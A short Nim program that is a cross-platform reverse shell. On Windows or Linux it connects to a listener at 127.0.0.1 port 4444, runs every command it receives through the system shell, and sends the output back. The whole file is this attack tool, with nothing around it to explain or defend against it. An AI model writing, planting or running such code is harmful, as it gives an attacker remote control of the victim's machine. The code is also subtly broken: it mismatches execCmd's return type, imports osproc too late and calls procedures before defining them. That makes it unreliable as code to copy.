import os, net, strutils

proc isWindows(): bool =
  return defined(windows)

proc isLinux(): bool =
  return defined(linux)

proc executeCommand(command: string): string =
  try:
    # Check the OS and execute the appropriate command
    if isWindows():
      result = execProcess("cmd /c " & command)
    elif isLinux():
      result = osproc.execCmd(command)
  except OSError as e:
    result = "Command execution failed: " & $e.msg

when isWindows():
  import osproc
  windowsSection()
elif isLinux():
  linuxSection()
else:
  echo "Unsupported operating system."

proc linuxSection() =
  var
    socket = newSocket()
    myIP = "127.0.0.1"
    myPort = "4444"
    exitMessage = "Exiting.."
    changeDirectoryCommand = "cd"
    defaultDirectory = "./"

  try:
    socket.connect(myIP, Port(parseInt(myPort)))

    while true:
      socket.send(os.getCurrentDir() & "> ")

      let command = socket.recvLine()

      if command == "exit":
        socket.send(exitMessage)
        break

      if command.strip() == changeDirectoryCommand:
        os.setCurrentDir(defaultDirectory)
      elif command.strip().startswith(changeDirectoryCommand):
        let directory = command.strip().split(' ')[1]
        try:
          os.setCurrentDir(directory)
        except OSError as error:
          socket.send(repr(error) & "\n")
          continue
      else:
        let result = executeCommand(command)
        socket.send(result)

  except:
    raise

  finally:
    socket.close()

proc windowsSection() =
  var
    socket = newSocket()
    myIP = "127.0.0.1"
    myPort = "4444"
    exitMessage = "Exiting.."
    changeDirectoryCommand = "cd"
    defaultDirectory = "C:\\"

  try:
    socket.connect(myIP, Port(parseInt(myPort)))

    while true:
      socket.send(os.getCurrentDir() & "> ")

      let command = socket.recvLine()

      if command == "exit":
        socket.send(exitMessage)
        break

      if command.strip() == changeDirectoryCommand:
        os.setCurrentDir(defaultDirectory)
      elif command.strip().startswith(changeDirectoryCommand):
        let directory = command.strip().split(' ')[1]
        try:
          os.setCurrentDir(directory)
        except OSError as error:
          socket.send(repr(error) & "\n")
          continue
      else:
        let result = executeCommand(command)
        socket.send(result)

  except:
    raise

  finally:
    socket.close()